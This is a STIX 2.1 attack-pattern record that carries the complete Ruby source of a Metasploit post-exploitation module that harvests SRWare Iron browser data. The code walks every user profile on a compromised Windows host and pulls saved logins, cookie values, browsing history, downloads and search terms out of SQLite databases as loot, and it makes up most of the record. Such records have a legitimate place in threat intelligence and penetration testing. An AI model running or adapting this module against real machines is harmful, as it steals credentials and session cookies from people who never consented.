{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3460ebe-af70-4499-aebb-2b938bb30eb9",
    "created": "2024-08-14T16:33:08.757425Z",
    "modified": "2024-08-14T16:33:08.757429Z",
    "name": "Srware credential gatherer",
    "description": " PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems. PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries. Further details can be found in the module documentation. This is a module that searches for Srware credentials on a windows remote host. SRWare Iron is a Chromium-based web browser developed by the German company SRWare.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/srware.rb",
            "external_id": "srware.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  # this associative array defines the artifacts known to PackRat\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Packrat\n\n  ARTIFACTS =\n    {\n      application: 'srware',\n      app_category: 'browsers',\n      gatherable_artifacts: [\n        {\n          filetypes: 'logins',\n          path: 'LocalAppData',\n          dir: 'Chromium',\n          artifact_file_name: 'Login Data',\n          description: \"SRware's sent and received emails\",\n          credential_type: 'sqlite',\n          sql_search: [\n            {\n              sql_description: \"Database Commands which exports SRware's Login data\",\n              sql_table: 'logins',\n              sql_column: 'action_url, username_value'\n            }\n          ]\n        },\n        {\n          filetypes: 'cookies',\n          path: 'LocalAppData',\n          dir: 'Chromium',\n          artifact_file_name: 'Cookies',\n          description: \"SRware's cookies\",\n          credential_type: 'sqlite',\n          sql_search: [\n            {\n              sql_description: \"Database Commands which exports SRware's Login data\",\n              sql_table: 'cookies',\n              sql_column: 'host_key, name, path, value'\n            }\n          ]\n        },\n        {\n          filetypes: 'web_history',\n          path: 'LocalAppData',\n          dir: 'Chromium',\n          artifact_file_name: 'History',\n          description: \"SRware's visited websites history\",\n          credential_type: 'sqlite',\n          sql_search: [\n            {\n              sql_description: \"Database Commands which exports SRware's Login data\",\n              sql_table: 'urls',\n              sql_column: 'url, title'\n            },\n            {\n              sql_description: \"Database Commands which exports SRware's Login data\",\n              sql_table: 'downloads',\n              sql_column: 'current_path, site_url'\n            },\n            {\n              sql_description: \"Database Commands which exports SRware's Login data\",\n              sql_table: 'segments',\n              sql_column: 'name'\n            },\n            {\n              sql_description: 'keyword search terms',\n              sql_table: 'keyword_search_terms',\n              sql_column: 'term'\n            }\n          ]\n        }\n      ]\n    }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Srware credential gatherer',\n        'Description' => %q{\n          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.\n          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.\n          Further details can be found in the module documentation.\n          This is a module that searches for Srware credentials on a windows remote host. SRWare Iron is a Chromium-based web browser developed by the German company SRWare.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kazuyoshi Maruta',\n          'Daniel Hallsworth',\n          'Barwar Salim M',\n          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),\n        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),\n        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),\n        # enumerates the options based on the artifacts that are defined below\n        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])\n      ]\n    )\n  end\n\n  def run\n    print_status('Filtering based on these selections:  ')\n    print_status(\"ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}\")\n    print_status(\"STORE_LOOT: #{datastore['STORE_LOOT']}\")\n    print_status(\"EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\\n\")\n\n    # used to grab files for each user on the remote host\n    grab_user_profiles.each do |userprofile|\n      run_packrat(userprofile, ARTIFACTS)\n    end\n\n    print_status 'PackRat credential sweep Completed'\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}